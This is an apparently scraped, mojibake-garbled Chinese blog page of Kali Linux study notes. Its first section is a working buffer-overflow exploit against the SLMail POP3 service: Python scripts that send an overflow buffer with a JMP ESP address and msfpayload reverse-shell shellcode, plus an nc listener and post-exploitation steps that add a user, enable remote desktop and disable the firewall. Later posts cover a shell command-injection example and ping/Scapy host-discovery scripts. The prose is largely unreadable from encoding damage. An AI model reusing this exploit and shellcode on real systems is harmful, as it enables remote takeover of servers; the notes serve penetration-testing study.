<li>åœ¨æ¨¡å—ä¸­æœç´¢FFE4æŒ‡ä»¤<ul>
<li>ï¼mona find -s â€œ\xFF\xE4â€(JMP ESPå¯¹åº”çš„äºŒè¿›åˆ¶æŒ‡ä»¤) -m openc32.dll</li>
<li>ï¼mona find -s â€œ\xFF\xE4â€(JMP ESPå¯¹åº”çš„äºŒè¿›åˆ¶æŒ‡ä»¤) -m mfc42.dll</li>
<li>ï¼mona find -s â€œ\xFF\xE4â€(JMP ESPå¯¹åº”çš„äºŒè¿›åˆ¶æŒ‡ä»¤) -m slmfc.dll</li>
<li>é€‰æ‹©ä¸åŒ…å«åå­—ç¬¦çš„å†…å­˜åœ°å€</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>åˆ‡æ¢æ±‡ç¼–è¯­è¨€è¡¨ç¤ºå½¢å¼ï¼šDisassemble
Memory Mapå†…å­˜åœ°å€å›¾æŸ¥çœ‹æ¨¡å—å¯¹åº”çš„åŸºåœ°å€æ˜¯å¦æ”¶åˆ°DEP,ALSRçš„ä¿æŠ¤ï¼Œæ˜¯å¦éœ€è¦ç»•è¿‡
â–²ç»•è¿‡DEPçš„ä¸€ç§æ–¹æ³•ï¼šMenmory Mapä¸­çš„å¯¹åº”çš„åŸºå€çš„Pocesséœ€ä¸ºï¼ˆREå¯è¯»å¯æ‰§è¡Œï¼‰</code></pre></blockquote>
<ul>
<li>åœ¨è¯¥åœ°å€è®¾ç½®æ–­ç‚¹<ul>
<li>è®¾ç½®æ–­ç‚¹ï¼šå³é”® â†’ BreakPoint â†’ Memory on acess</li>
<li>Debug â†’ Step infoå•æ­¥æ‰§è¡Œ</li>
</ul>
</li>
<li>é‡å‘bufferï¼ˆå°ç«¯å­˜å‚¨ â†’ åœ°å€å®Œå…¨ç¿»è½¬ï¼‰<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./08.py</code></strong>ï¼ˆæŸ¥çœ‹æ¨¡å—æŒ‡ä»¤çš„åœ°å€æ˜¯å¦ä¸ºESPçš„åœ°å€ï¼‰</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;\x8f\x35\x4a\x5f&apos;+&apos;C&apos;*390</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IPåœ°å€&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<h4 id="10-FUZZING"><a href="#10-FUZZING" class="headerlink" title="10. FUZZING"></a>10. FUZZING</h4><ul>
<li>ç”ŸæˆShellcodeï¼ˆæ³¨æ„åå­—ç¬¦ï¼‰</li>
<li>Scratchï¼ˆå†™Shellcodeçš„å·¥å…·ï¼‰</li>
<li>cd /usr/share/framework2</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./msfpayload -l</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./msfpayload win32_reverse LHOST=åå‘IPåœ°å€ LPORT=åå‘ç«¯å£ C</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./msfpayload win32_reverse LHOST=IPåœ°å€ LPORT=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code></strong>ï¼ˆæœ€åéœ€è¦ç”¨â€+â€è¿›è¡Œè¿æ¥ï¼‰</li>
</ul>
<blockquote>
<pre><code>win32_adduser å¢åŠ ç”¨æˆ·çš„Shellcode
win32_bind    å¢åŠ ç›‘å¬çš„è¿›ç¨‹ï¼Œå¯ä»¥å¼€å¯ç›¸åº”çš„ç«¯å£
â–² æ­£å‘çš„bindåŸºæœ¬ä¸Šä¼šè¢«é˜²ç«å¢™è¿‡æ»¤
â–² åå‘ï¼ˆreserverï¼‰çš„bindï¼ŒæœåŠ¡ç«¯ä¼šå¼€æ”¾ç«¯å£ï¼Œä¸»åŠ¨è¿æ¥å¤–éƒ¨ç½‘ç»œ
â–² msfencodeå¯å¯¹Shellcodeåšå…æ€ï¼Œä¹Ÿå¯ä»¥ç¼–æ‰åå­—ç¬¦ï¼Œè¿›è¡Œç¼–ç éœ€è¦æŒ‡å®šåŸå§‹æ ¼å¼ R</code></pre></blockquote>
<ul>
<li>**`ğŸ”ºå‘½ä»¤ï¼šnc -vlp 443</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./09.py</code></strong>ï¼ˆè„šæœ¬åé—¨ï¼‰</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">shellcode=(</span><br><span class="line">&quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x7c\xac\x3f&quot;+</span><br><span class="line">&quot;\xac\x83\xeb\xfc\xe2\xf4\x80\xc6\xd4\xe1\x94\x55\xc0\x53\x83\xcc&quot;+</span><br><span class="line">&quot;\xb4\xc0\x58\x88\xb4\xe9\x40\x27\x43\xa9\x04\xad\xd0\x27\x33\xb4&quot;+</span><br><span class="line">&quot;\xb4\xf3\x5c\xad\xd4\xe5\xf7\x98\xb4\xad\x92\x9d\xff\x35\xd0\x28&quot;+</span><br><span class="line">&quot;\xff\xd8\x7b\x6d\xf5\xa1\x7d\x6e\xd4\x58\x47\xf8\x1b\x84\x09\x49&quot;+</span><br><span class="line">&quot;\xb4\xf3\x58\xad\xd4\xca\xf7\xa0\x74\x27\x23\xb0\x3e\x47\x7f\x80&quot;+</span><br><span class="line">&quot;\xb4\x25\x10\x88\x23\xcd\xbf\x9d\xe4\xc8\xf7\xef\x0f\x27\x3c\xa0&quot;+</span><br><span class="line">&quot;\xb4\xdc\x60\x01\xb4\xec\x74\xf2\x57\x22\x32\xa2\xd3\xfc\x83\x7a&quot;+</span><br><span class="line">&quot;\x59\xff\x1a\xc4\x0c\x9e\x14\xdb\x4c\x9e\x23\xf8\xc0\x7c\x14\x67&quot;+</span><br><span class="line">&quot;\xd2\x50\x47\xfc\xc0\x7a\x23\x25\xda\xca\xfd\x41\x37\xae\x29\xc6&quot;+</span><br><span class="line">&quot;\x3d\x53\xac\xc4\xe6\xa5\x89\x01\x68\x53\xaa\xff\x6c\xff\x2f\xef&quot;+</span><br><span class="line">&quot;\x6c\xef\x2f\x53\xef\xc4\xbc\x04\x5b\xc6\x1a\xc4\x3e\x17\x1a\xff&quot;+</span><br><span class="line">&quot;\xb6\x4d\xe9\xc4\xd3\x55\xd6\xcc\x68\x53\xaa\xc6\x2f\xfd\x29\x53&quot;+</span><br><span class="line">&quot;\xef\xca\x16\xc8\x59\xc4\x1f\xc1\x55\xfc\x25\x85\xf3\x25\x9b\xc6&quot;+</span><br><span class="line">&quot;\x7b\x25\x9e\x9d\xff\x5f\xd6\x39\xb6\x51\x82\xee\x12\x52\x3e\x80&quot;+</span><br><span class="line">&quot;\xb2\xd6\x44\x07\x94\x07\x14\xde\xc1\x1f\x6a\x53\x4a\x84\x83\x7a&quot;+</span><br><span class="line">&quot;\x64\xfb\x2e\xfd\x6e\xfd\x16\xad\x6e\xfd\x29\xfd\xc0\x7c\x14\x01&quot;+</span><br><span class="line">&quot;\xe6\xa9\xb2\xff\xc0\x7a\x16\x53\xc0\x9b\x83\x7c\x57\x4b\x05\x6a&quot;+</span><br><span class="line">&quot;\x46\x53\x09\xa8\xc0\x7a\x83\xdb\xc3\x53\xac\xc4\xcf\x26\x78\xf3&quot;+</span><br><span class="line">&quot;\x6c\x53\xaa\x53\xef\xac&quot;)</span><br><span class="line">buffer=&apos;A&apos;*2607+&apos;\x8f\x35\x4a\x5f&apos;+&apos;\x90&apos;*8+shellcode</span><br><span class="line">try:</span><br><span class="line">    print &quot;\nSending evil buffer...&quot;</span><br><span class="line">    s.connect((&quot;IPåœ°å€&quot;,110))</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;USER test&apos;+&apos;\r\n&apos;)</span><br><span class="line">    data=s.recv(1024)</span><br><span class="line">    s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)</span><br><span class="line">    print &quot;\nDone!&quot;</span><br><span class="line">except:</span><br><span class="line">    print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>æ±‡ç¼–è¯­è¨€çš„\0x90ï¼Œè¡¨ç¤ºNOPï¼ˆä¸æ“ä½œï¼‰ï¼Œä¸ºäº†ä¿è¯Shellcodeè¿è¡Œæœ‰æ•ˆæ€§ï¼Œä»ç»éªŒä¸Šæ¥è°ˆï¼ŒCPUåœ¨è·³è½¬è§£æçš„æ—¶å€™ï¼Œå¯èƒ½ä¼šæ“¦é™¤ï¼Œè¦†ç›–Shellcodeçš„å‰å‡ ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦åŠ NOPè¿›è¡Œä¸æ“ä½œ</code></pre></blockquote>
<h4 id="11-FUZZING"><a href="#11-FUZZING" class="headerlink" title="11. FUZZING"></a>11. FUZZING</h4><ul>
<li>æ—©æœŸçš„msfpayload<ul>
<li>Shellcodeæ‰§è¡Œåä¼šä¸€ExitProcessæ–¹å¼é€€å‡ºæ•´ä¸ªè¿›ç¨‹ï¼Œå°†å¯¼è‡´é‚®ä»¶æœåŠ¡å´©æºƒ</li>
<li>SLMailæ˜¯ä¸€ä¸ªåŸºäºçº¿ç¨‹çš„åº”ç”¨ï¼Œé€‚ç”¨ExitThreadæ–¹å¼å¯ä»¥é¿å…æ•´ä¸ªç³»ç»Ÿå´©æºƒï¼Œå¯å®ç°é‡å¤æº¢å‡º</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./msfpayload win32_reverser LHOST=åå‘IPåœ°å€ EXITFUNC=thread LPORT=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code></strong></li>
</ul>
</li>
</ul>
<h4 id="12-FUZZING"><a href="#12-FUZZING" class="headerlink" title="12. FUZZING"></a>12. FUZZING</h4><blockquote>
<pre><code>1.ä¿®æ”¹æ³¨å†Œè¡¨å¼€å¯è¿œç¨‹æ¡Œé¢æ§åˆ¶åéœ€é‡å¯è®¡ç®—æœºï¼ˆshutdown -r -t 0ï¼‰
2.æŸ¥çœ‹è¿œç¨‹æ¡Œé¢æ˜¯å¦å¼€å¯ï¼ˆæˆ‘çš„ç”µè„‘ â†’ å±æ€§ â†’ è¿œç¨‹ï¼‰
3.apt-get install rdesktop
4.rdesktop è¿œç¨‹IP
5.nc -vlp 443 
6.å¢åŠ ç”¨æˆ·ï¼ˆnet user ç”¨æˆ· å¯†ç  /addï¼‰
â–² å¯ä»¥é€šè¿‡æ³¨å†Œè¡¨å…³é—­é˜²ç«å¢™ï¼ˆregsnapå¯æŠ“å–æ³¨å†Œè¡¨å˜åŒ–ï¼‰</code></pre></blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%85%AD)%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/11/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%85%AD)%EF%BC%9A%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D/" itemprop="url">Kali Linuxç¬”è®°(äºŒåå…­)ï¼šç¼“å†²åŒºæº¢å‡ºä»‹ç»</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-12-11T13:03:16+08:00">
                2019-12-11
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  293 å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  1 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-ç¨‹åºæ¼æ´ä»å“ªé‡Œæ¥ï¼ˆç¨‹åºçš„åŠ¨æ€ï¼Œå˜é‡ï¼‰"><a href="#1-ç¨‹åºæ¼æ´ä»å“ªé‡Œæ¥ï¼ˆç¨‹åºçš„åŠ¨æ€ï¼Œå˜é‡ï¼‰" class="headerlink" title="1. ç¨‹åºæ¼æ´ä»å“ªé‡Œæ¥ï¼ˆç¨‹åºçš„åŠ¨æ€ï¼Œå˜é‡ï¼‰"></a>1. ç¨‹åºæ¼æ´ä»å“ªé‡Œæ¥ï¼ˆç¨‹åºçš„åŠ¨æ€ï¼Œå˜é‡ï¼‰</h4><ul>
<li>ç½ªæ¶çš„æ ¹æºï¼šå˜é‡</li>
<li>æ•°æ®ä¸ä»£ç è¾¹ç•Œä¸æ¸…ï¼ˆè¾“å…¥æ•°æ®æˆ–è€…ä»£ç ï¼‰</li>
<li>æœ€ç®€æ¼æ´åŸç†â€“shellè„šæœ¬æ¼æ´<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./a.sh å‚æ•°</code></strong>ï¼ˆ; | &amp;&amp; &amp;ï¼‰</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo $1</span><br></pre></td></tr></table></figure>

<blockquote>
<pre><code>./a.sh ; pwd â†’  /root</code></pre></blockquote>
<h4 id="2-ç¼“å­˜åŒºæº¢å‡º"><a href="#2-ç¼“å­˜åŒºæº¢å‡º" class="headerlink" title="2. ç¼“å­˜åŒºæº¢å‡º"></a>2. ç¼“å­˜åŒºæº¢å‡º</h4><ul>
<li>å½“ç¼“å†²åŒºè¾¹ç•Œé™åˆ¶ä¸ä¸¥æ ¼æ—¶ï¼Œç”±äºå˜é‡ä¼ å…¥ç•¸å½¢æ•°æ®æˆ–ç¨‹åºè¿è¡Œé”™è¯¯ï¼Œå¯¼è‡´ç¼“å­˜åŒºâ€œæ’‘çˆ†â€ï¼Œä»è€Œè¦†ç›–äº†ç›¸é‚»å†…å­˜åŒºåŸŸçš„æ•°æ®ï¼›</li>
<li>æˆåŠŸä¿®æ”¹å†…å­˜æ•°æ®ï¼Œå¯é€ æˆè¿›ç¨‹åŠ«æŒï¼Œæ‰§è¡Œæ¶æ„ä»£ç ï¼Œè·å–æœåŠ¡å™¨æ§åˆ¶æƒé™ç­‰åæœ</li>
</ul>
<h4 id="3-å¦‚ä½•å‘ç°æ¼æ´"><a href="#3-å¦‚ä½•å‘ç°æ¼æ´" class="headerlink" title="3. å¦‚ä½•å‘ç°æ¼æ´"></a>3. å¦‚ä½•å‘ç°æ¼æ´</h4><ul>
<li>æºç å®¡è®¡ï¼ˆæºç  â†’ ä½¿ç”¨äº†ä¸å®‰å…¨çš„å‡½æ•°ï¼Œå¯¹ç”¨æˆ·æ•°æ®è¿›è¡Œè¿‡æ»¤ï¼Œç¼–ç ï¼‰</li>
<li>é€†å‘å·¥ç¨‹ï¼ˆæ‰“åŒ…åçš„ç¨‹åº â†’ åæ±‡ç¼– ï¼‰</li>
<li>æ¨¡ç³Šæµ‹è¯•ï¼ˆåœ¨æ–°çš„OSç¯å¢ƒä¸­ï¼Œåœ¨OSä¸­è¿›è¡Œå®‰è£…ï¼Œç”¨å·¥å…·è¿›è¡Œç›‘è§†ï¼Œè°ƒè¯•ï¼Œæ’å…¥ï¼‰<ul>
<li>å‘ç¨‹åºå †æ ˆåŠéšæœºçš„æ•°æ®ï¼Œæ ¹æ®å†…å­˜å˜åŒ–åˆ¤æ–­æº¢å‡º</li>
<li>æ•°æ®ç”Ÿæˆå™¨ï¼šç”Ÿæˆéšæœºï¼ŒåŠéšæœºæ•°æ®ï¼ˆç¼–ç¨‹è¯­è¨€å®ç°æ‰“å‘ç¨‹åºï¼‰</li>
<li>æµ‹è¯•å·¥å…·ï¼šè¯†åˆ«æº¢å‡ºæ¼æ´ï¼ˆåŠ¨æ€è°ƒè¯•å·¥å…·ï¼‰</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%BA%94)%EF%BC%9A%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0--%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%BA%94)%EF%BC%9A%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0--%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0/" itemprop="url">Kali Linuxç¬”è®°(åäº”)ï¼šä¸»æœºå‘ç°--ä¸‰å±‚å‘ç°</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-12-10T08:13:38+08:00">
                2019-12-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  880 å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  4 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆpingï¼‰"><a href="#1-å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆpingï¼‰" class="headerlink" title="1. å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆpingï¼‰"></a>1. å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆpingï¼‰</h4><ul>
<li>ä¼˜ç‚¹<ul>
<li>å¯è·¯ç”±</li>
<li>é€Ÿåº¦æ¯”è¾ƒå¿«</li>
</ul>
</li>
<li>ç¼ºç‚¹<ul>
<li>é€Ÿåº¦æ¯”äºŒå±‚æ…¢</li>
<li>ç»å¸¸è¢«è¾¹ç•Œé˜²ç«å¢™è¿‡æ»¤ï¼ˆç›®æ ‡ç³»ç»Ÿçš„è¿‡æ»¤æœºåˆ¶ï¼‰</li>
</ul>
</li>
<li>IPã€ICMPåè®®</li>
</ul>
<blockquote>
<pre><code>ICMPåè®®ï¼Œç½‘ç»œæ§åˆ¶ç®¡ç†åè®®ï¼Œè·¯å¾„å‘ç°ï¼Œæ¢æµ‹ï¼Œæ ¹æ®ç›¸åº”ç»“æœæ¥ååº”ç›®æ ‡ä¸»æœºçš„çŠ¶æ€
ICMPåè®®ï¼Œå‘é€ç«¯çš„æŠ¥æ–‡ç±»å‹æ˜¯è¯¢é—®æŠ¥æ–‡ï¼ŒTypeå­—æ®µä¸º8ï¼Œæ¥æ”¶ç«¯ä¸º0
ç½‘ç»œä¸Šé»˜è®¤ç¦æ­¢ICMPçš„æ¢æµ‹æ•°æ®åŒ…ï¼Œæ‰€ä»¥å¯¼è‡´æ‰«æç»“æœä¸å‡†ç¡®ï¼Œå­˜åœ¨è¯¯æŠ¥ï¼Œæ¼æŠ¥ï¼Œé”™æŠ¥</code></pre></blockquote>
<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šPing IPåœ°å€ -c 2</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šPing -Rï¼ˆè·¯ç”±è¿½è¸ªï¼‰ IPåœ°å€ / traceroute IPåœ°å€</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šping  IPåœ°å€ -c 1 | grep &quot;bytes from&quot; | awk &#39;{print $4}&#39;</code></strong></li>
<li>è„šæœ¬<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./pinger.sh IPç½‘æ®µ</code></strong>  â–²2019.12.2 iplistæ–‡æ¡£ä¸­ipåœ°å€åé¢æœ‰ï¼šï¼Œè¿˜æ— æ³•å»é™¤</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">if [ &quot;$#&quot; -ne 1 ];then</span><br><span class="line">    echo &quot;Usage - ./pinger.sh [/24 network address]&quot;</span><br><span class="line">    echo &quot;Example - ./pinger.sh 192.168.100.0&quot;</span><br><span class="line">    echo &quot;Example will perform an ICMP ping scan of the 192.168.100.0/24 network&quot;</span><br><span class="line">    exit</span><br><span class="line">fi</span><br><span class="line">prefix=$(echo $1 | cut -d &quot;.&quot; -f 1-3)</span><br><span class="line">for add in $(seq 1 254);do</span><br><span class="line">  ping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | awk &apos;&#123;print $4&#125;&apos;  &amp;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>


<blockquote>
<pre><code>Linux/Unixæ•°æ®åŒ…çš„TTLå€¼é»˜è®¤ä¸º64
ping -R è¯·æ±‚ç¦»ä¸»æœºæ¯”è¾ƒè¿œçš„ç½‘å¡çš„IPåœ°å€ï¼ˆåŒä¸ªè·¯ç”±å™¨ï¼‰
traceroute è¯·æ±‚ç¦»ä¸»æœºæ¯”è¾ƒè¿‘çš„ç½‘å¡çš„IPåœ°å€ï¼ˆåŒä¸ªè·¯ç”±å™¨ï¼‰</code></pre></blockquote>
<h4 id="2-å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆScapyï¼‰"><a href="#2-å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆScapyï¼‰" class="headerlink" title="2. å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆScapyï¼‰"></a>2. å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆScapyï¼‰</h4><ul>
<li>Scapy<ul>
<li>OSIå¤šå±‚å †å æ‰‹å·¥å£°ç§°ICMPåŒ…-IP/ICMPåŒ…</li>
<li>ip=IP()</li>
<li>icmp=ICMP()</li>
<li>ping=(ip/icmp)</li>
<li>ping[IP].dst=â€IPåœ°å€â€</li>
<li>a=sr1(ping)</li>
<li>a.dispaly</li>
<li>Pingä¸å­˜åœ¨çš„åœ°å€ï¼ša=sr1(ip/icmp,timeout=1)</li>
<li>a=sr1(IP(dst=â€IPåœ°å€â€)/ICMP(),timeout=1)  //ä¸€å¥è¯å®ç°</li>
</ul>
</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./pinger1.py IPç½‘æ®µ&gt;iplist.txt</code></strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import logging</span><br><span class="line">import subprocess</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=2:</span><br><span class="line">    print &quot;Usage - ./pinger1.py [/24 network address]&quot;</span><br><span class="line">    print &quot;Example - ./pinger1.py 192.168.100.0&quot;</span><br><span class="line">    print &quot;Example will perform an ICMP ping scan of the 192.168.100.0/24 network&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">address=str(sys.argv[1])</span><br><span class="line">prefix=address.split(&quot;.&quot;)[0]+&quot;.&quot;+address.split(&quot;.&quot;)[1]+&quot;.&quot;+address.split(&quot;.&quot;)[2]+&quot;.&quot;</span><br><span class="line"></span><br><span class="line">for addr in range(1,254):</span><br><span class="line">     a=sr1(IP(dst=prefix+str(addr))/ICMP(),timeout=1,verbose=0)</span><br><span class="line">     if a==None:</span><br><span class="line">       pass</span><br><span class="line">     else:</span><br><span class="line">       print prefix+str(addr)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./pinger2.py iplist.txt</code></strong></li>
</ul>
